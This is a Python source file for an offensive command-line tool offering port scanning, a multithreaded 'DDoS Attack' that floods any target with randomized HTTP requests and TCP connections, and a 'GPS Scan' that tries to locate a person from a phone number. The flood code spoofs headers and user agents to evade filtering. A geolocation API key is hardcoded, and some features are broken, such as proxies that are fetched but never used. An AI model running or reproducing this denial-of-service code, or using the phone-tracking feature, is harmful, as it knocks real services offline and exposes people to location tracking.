import socket
import threading
import os
import requests
import random
import time
import requests
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import sys
from tqdm import tqdm

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

BOLD = '\033[1m'
UNDERLINE = '\033[4m'
ITALIC = '\033[3m'

log_file = "ddos_log.txt"

GEOLOCATION_API_KEY = "2d6f9ae082ef438f9c690a7424802396"

def clear_screen():
    """Clears the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    """Displays a cooler, more stylized banner."""
    print(f"""
{CYAN} ▀▄░▄▀ ░█▀▀█ ░█──░█ ▀▀█▀▀ ░█▀▀▀ 
{CYAN} ─░█── ░█▀▀▄ ░█▄▄▄█ ─░█── ░█▀▀▀ 
{CYAN} ▄▀░▀▄ ░█▄▄█ ──░█── ─░█── ░█▄▄▄
{WHITE}
{BOLD}{CYAN}  Crafted by: {GREEN}R̴͔͔̫̓̐͝I̸͉̻̻̓̓́Z̵̡̠͔̀͌͝X̵͎̪̪̽̚͝B̸͓̝̝̈́͑Y̸̞̠͕̔͝T̴̞̙͕̓̀Ë̵͎͓́͜͠{RESET}
{BOLD}{CYAN}  Version: {YELLOW}1.0{RESET}
    """)

def get_random_user_agent():
    """Returns a random User-Agent string to mimic different browsers."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
    ]
    return random.choice(user_agents)

def get_ip(url):
    """Retrieves the IP address of a given URL."""
    try:
        response = requests.get(url)
        url = response.url
        ip = socket.gethostbyname(url.split('//')[-1].split('/')[0])
        print(f"{GREEN}[+] IP address of {url} is: {CYAN}{ip}{RESET}")
    except requests.exceptions.RequestException:
        try:
            ip = socket.gethostbyname(url.split('//')[-1].split('/')[0])
            print(f"{GREEN}[+] IP address of {url} is: {CYAN}{ip}{RESET}")
        except socket.gaierror:
            print(f"{RED}[-] Failed to get IP address of {url}{RESET}")

def check_port(target, port):
    """Checks if a given port is open on the target."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((target, port))
        sock.close()
        return True
    except (socket.error, socket.timeout):
        return False

def port_scan(target):
    """Scans all common ports on the target and lists open ports."""
    print(f"{YELLOW}[*] Starting port scan on {target}...{RESET}")
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    for port in common_ports:
        if check_port(target, port):
            print(f"{GREEN}[+] Port {port} is open{RESET}")
            open_ports.append(port)
        else:
            print(f"{RED}[-] Port {port} is closed{RESET}")
    return open_ports

def log_attack(target, port, threads, duration, success=True):
    """Logs the details of a DDoS attack to a file."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    status = "Success" if success else "Failed"
    log_message = f"[{timestamp}] Target: {target}:{port}, Threads: {threads}, Duration: {duration} seconds, Status: {status}\n"
    try:
        with open(log_file, "a") as f:
            f.write(log_message)
        print(f"{GREEN}[+] Attack logged to {log_file}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error logging attack: {e}{RESET}")

def attack(target, port, threads, duration, use_proxies):
    """Launches a combined HTTP and SYN flood DDoS attack against the target."""
    if not check_port(target, port):
        print(f"{RED}[-] Port {port} is closed on {target}{RESET}")
        log_attack(target, port, threads, duration, success=False)
        return

    proxies = []
    if use_proxies:
        try:
            response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            if response.status_code == 200:
                proxies = response.text.splitlines()
                print(f"{GREEN}[+] Loaded {len(proxies)} proxies.{RESET}")
            else:
                print(f"{YELLOW}[!] Failed to load proxies. Continuing without proxies.{RESET}")
        except requests.exceptions.RequestException:
            print(f"{YELLOW}[!] Failed to fetch proxies. Continuing without proxies.{RESET}")

    start_time = time.time()
    not_found_count = 0
    total_requests = 0
    timeout_count = 0
    socket_error_count = 0

    with tqdm(total=duration, desc=f"{CYAN}DDoS Attack Progress{RESET}", unit="s", bar_format="{l_bar}%s{bar}%s{r_bar}" % (CYAN, RESET)) as pbar:

        def http_flood():
            """Sends HTTP requests to the target in a loop."""
            nonlocal not_found_count, total_requests, timeout_count, socket_error_count

            while time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.05)
                    sock.connect((target, port))

                    http_header = f"GET /nonexistentpage-{random.randint(0, 9999)} HTTP/1.1\r\n"
                    http_header += f"Host: {target}\r\n"
                    http_header += f"User-Agent: {get_random_user_agent()}\r\n"
                    http_header += "Cache-Control: no-cache\r\n"
                    http_header += "Connection: keep-alive\r\n"
                    http_header += "X-Forwarded-For: {}.{}.{}.{}\r\n".format(random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
                    http_header += f"Accept-Language: {random.choice(['en-US', 'fr-CA', 'de-DE'])}\r\n"
                    http_header += f"Referer: {random.choice(['https://google.com', 'https://bing.com', 'https://duckduckgo.com'])}\r\n"
                    data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 500)))
                    http_header += f"Content-Length: {len(data)}\r\n"
                    http_header += "\r\n" + data

                    if use_proxies and proxies:
                        proxy = random.choice(proxies)
                        try:
                            sock.sendto(http_header.encode('ascii'), (target, port))
                        except socket.error:
                            print(f"{RED}[-] Proxy connection error. Trying another proxy.{RESET}")
                            continue
                    else:
                        sock.sendto(http_header.encode('ascii'), (target, port))

                    total_requests += 1

                    try:
                        response = sock.recv(1024)
                        response_str = response.decode('ascii', errors='ignore')
                        if "404 Not Found" in response_str:
                            print(f"{GREEN}[+] 404 Not Found Received!{RESET}")
                            not_found_count += 1
                        elif b"504 Gateway Timeout" in response or b"503 Service Unavailable" in response or b"429 Too Many Requests" in response:
                            print(f"{GREEN}[+] 504/503/429 Error Received! Server is struggling!{RESET}")
                        else:
                            print(f"{YELLOW}[-] No 404/504/503/429 Error. Response: {response[:50].decode('ascii', errors='ignore')}{RESET}")

                    except socket.timeout:
                        timeout_count += 1
                        print(f"{RED}[-] Socket timeout.{RESET}")

                    except socket.error as e:
                        socket_error_count += 1
                        print(f"{RED}[-] Connection error: {e}{RESET}")

                    finally:
                        sock.close()

                except Exception as e:
                    print(f"{RED}[-] Unexpected error in http_flood: {e}{RESET}")

        def syn_flood():
            """Sends SYN packets to the target in a loop."""
            while time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.05)
                    sock.connect((target, port))
                    sock.send(b"")
                    sock.close()
                    print(f"{BLUE}[+] SYN Flood Packet Sent!{RESET}")
                except socket.error as e:
                    print(f"{RED}[-] SYN Flood Error: {e}{RESET}")
                except Exception as e:
                    print(f"{RED}[-] Unexpected error in syn_flood: {e}{RESET}")
                finally:
                    if 'sock' in locals():
                        sock.close()

        threads_list = []
        for i in range(threads // 2):
            thread = threading.Thread(target=http_flood)
            threads_list.append(thread)
            thread.start()

        for i in range(threads // 2, threads):
            thread = threading.Thread(target=syn_flood)
            threads_list.append(thread)
            thread.start()

        print(f"{GREEN}[+] Attack started! Target: {target}:{port} | Threads: {threads} | Duration: {duration} seconds.{RESET}")

        while time.time() - start_time < duration:
            time.sleep(1)
            pbar.update(1)
            rps = total_requests / (time.time() - start_time)
            pbar.set_postfix({"RPS": f"{rps:.2f}", "404s": not_found_count, "Timeouts": timeout_count, "Errors": socket_error_count})

        for thread in threads_list:
            thread.join()

        print(f"{GREEN}[+] Attack finished!{RESET}")
        print(f"{GREEN}[+] 404 Not Found Count: {not_found_count}{RESET}")
        print(f"{GREEN}[+] Total Requests Sent: {total_requests}{RESET}")
        print(f"{GREEN}[+] Total Timeouts: {timeout_count}{RESET}")
        print(f"{GREEN}[+] Total Socket Errors: {socket_error_count}{RESET}")
        log_attack(target, port, threads, duration, success=True)

def get_location_from_number(phone_number):
    try:
        number = phonenumbers.parse(phone_number, None)
        location = geocoder.description_for_number(number, "en")
        sim_carrier = carrier.name_for_number(number, "en")
        time_zones = timezone.time_zones_for_number(number)
        formatted_number = phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        url = f"https://api.opencagedata.com/geocode/v1/json?q={formatted_number}&key={GEOLOCATION_API_KEY}"
        response = requests.get(url)
        data = response.json()

        if data and data['results']:
            latitude = data['results'][0]['geometry']['lat']
            longitude = data['results'][0]['geometry']['lng']
            address_components = data['results'][0]['components']
            address = data['results'][0]['formatted']
            city = address_components.get('city', 'N/A')
            county = address_components.get('county', 'N/A')
            state = address_components.get('state', 'N/A')
            country = address_components.get('country', 'N/A')
            postcode = address_components.get('postcode', 'N/A')
            return location, sim_carrier, time_zones, latitude, longitude, address, city, county, state, country, postcode
        else:
            print(f"{YELLOW}[!] No results from geolocation API. Trying fallback...{RESET}")
            return location, sim_carrier, time_zones, None, None, None, None, None, None, None, None

    except phonenumbers.phonenumberutil.NumberParseException:
        return None, None, None, None, None, None, None, None, None, None, None
    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Geolocation API request failed: {e}{RESET}")
        return location, sim_carrier, time_zones, None, None, None, None, None, None, None, None
    except Exception as e:
        print(f"{RED}[-] Error during geolocation: {e}{RESET}")
        return location, sim_carrier, time_zones, None, None, None, None, None, None, None, None

def gps_scan():
    phone_number = input(f"{WHITE}Enter phone number with country code (e.g., +62xxx): {RESET}")
    location, sim_carrier, time_zones, latitude, longitude, address, city, county, state, country, postcode = get_location_from_number(phone_number)
    if location:
        print(f"{GREEN}[+] Approximate location: {CYAN}{location}{RESET}")
        print(f"{GREEN}[+] Carrier: {CYAN}{sim_carrier}{RESET}")
        print(f"{GREEN}[+] Timezones: {CYAN}{', '.join(time_zones)}{RESET}")
        if latitude and longitude:
            print(f"{GREEN}[+] Latitude: {CYAN}{latitude}{RESET}")
            print(f"{GREEN}[+] Longitude: {CYAN}{longitude}{RESET}")
            print(f"{GREEN}[+] Address: {CYAN}{address}{RESET}")
            print(f"{GREEN}[+] City: {CYAN}{city}{RESET}")
            print(f"{GREEN}[+] County: {CYAN}{county}{RESET}")
            print(f"{GREEN}[+] State: {CYAN}{state}{RESET}")
            print(f"{GREEN}[+] Country: {CYAN}{country}{RESET}")
            print(f"{GREEN}[+] Postcode: {CYAN}{postcode}{RESET}")
        else:
            print(f"{YELLOW}[!] Could not retrieve accurate coordinates or address details. Only approximate location available.{RESET}")
    else:
        print(f"{RED}[-] Could not determine location for the given phone number.{RESET}")

if __name__ == "__main__":
    gps_scan()

def menu():
    """Displays the main menu of the tool with enhanced UI."""
    while True:
        clear_screen()
        banner()
        print(f"{YELLOW}{BOLD}Choose an option:{RESET}")
        print(f"{YELLOW}[1] Check Website IP{RESET}")
        print(f"{YELLOW}[2] Port Scan{RESET}")
        print(f"{YELLOW}[3] DDoS Attack{RESET}")
        print(f"{YELLOW}[4] GPS Scan{RESET}")
        print(f"{YELLOW}[5] Exit{RESET}")

        choice = input(f"{WHITE}Enter your choice: {RESET}")

        if choice == '1':
            url = input(f"{WHITE}Enter website URL: {RESET}")
            get_ip(url)
        elif choice == '2':
            target = input(f"{WHITE}Enter target IP: {RESET}")
            port_scan(target)
        elif choice == '3':
            target = input(f"{WHITE}Enter target IP: {RESET}")
            port = int(input(f"{WHITE}Enter target port: {RESET}"))
            threads = int(input(f"{WHITE}Enter number of threads: {RESET}"))
            duration = int(input(f"{WHITE}Enter attack duration (seconds): {RESET}"))
            use_proxies = input(f"{WHITE}Use proxies? (y/n): {RESET}").lower() == 'y'
            attack(target, port, threads, duration, use_proxies)
        elif choice == '4':
            gps_scan()
        elif choice == '5':
            print(f"{YELLOW}Exiting...{RESET}")
            break
        else:
            print(f"{RED}[-] Invalid choice!{RESET}")

        input(f"{WHITE}Press Enter to return to menu...{RESET}")

if __name__ == "__main__":
    menu()